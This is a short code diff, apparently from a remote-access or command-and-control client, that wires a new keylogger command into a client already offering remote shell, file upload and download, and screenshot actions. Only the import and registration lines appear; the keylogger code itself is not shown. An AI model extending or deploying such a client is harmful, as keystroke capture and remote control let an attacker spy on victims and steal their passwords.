@@ -17,6 +17,7 @@ from common.constants import (
     DOWNLOAD_ACTION,
     HANDSHAKE_ACTION,
     HELP_ACTION,
+    KEYLOGGER_ACTION,
     MAX_RETRIES,
     RETRY_BACKOFF_FACTOR,
     RETRY_DELAY,
@@ -32,6 +33,7 @@ from client.commands.download import DownloadCommand
 from client.commands.upload import UploadCommand
 from client.commands.shell import ShellCommand
 from client.commands.screenshot import ScreenshotCommand
+from client.commands.keylogger import KeyloggerCommand
 from common.protocol import (
     build_command,
     build_handshake_command,
@@ -70,6 +72,7 @@ class Client:
             UPLOAD_ACTION: UploadCommand(),
             SHELL_ACTION: ShellCommand(),
             SCREENSHOT_ACTION: ScreenshotCommand(),
+            KEYLOGGER_ACTION: KeyloggerCommand(),
         }
         self._retry_count = 0
         self._shutdown = False
